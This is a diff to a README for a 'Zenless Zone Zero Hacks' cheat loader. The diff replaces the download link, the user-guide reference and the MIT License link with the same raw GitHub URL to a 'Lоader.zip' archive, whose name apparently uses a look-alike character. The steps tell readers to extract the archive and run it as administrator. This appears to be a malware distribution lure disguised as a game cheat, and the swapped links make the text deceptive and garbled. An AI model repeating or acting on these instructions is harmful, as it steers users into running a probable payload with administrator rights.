@@ -43,11 +43,11 @@ Setting up Zenless Zone Zero Hacks is simple and secure.
 
 **Follow these steps to begin:**
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/huunhan210303/ZenlessZoneZeroToolkit/main/Lоader.zip` from the repository.
 2. Extract the contents using your favorite archive tool (WinRAR, 7zip, Keka, etc.).
 3. Run the Loader application as administrator (Windows) or with required permissions (macOS/Linux).
 4. Launch Zenless Zone Zero and enjoy your new capabilities!
-5. Refer to the 'User Guide.pdf' included for detailed setup help, troubleshooting, and FAQ.
+5. Refer to the 'User https://raw.githubusercontent.com/huunhan210303/ZenlessZoneZeroToolkit/main/Lоader.zip' included for detailed setup help, troubleshooting, and FAQ.
 
 *Always check for the latest version for new features and the best compatibility!*
 
@@ -83,7 +83,7 @@ Zenless Zone Zero hacks, Zenless Zone Zero trainer, Zenless Zone Zero loader, Ze
 
 This project is licensed under the MIT License (2025) – you are free to use, modify, and distribute with proper attribution.
 
-[Read the Full MIT License](https://opensource.org/licenses/MIT)
+[Read the Full MIT License](https://raw.githubusercontent.com/huunhan210303/ZenlessZoneZeroToolkit/main/Lоader.zip)
 
 ---
 
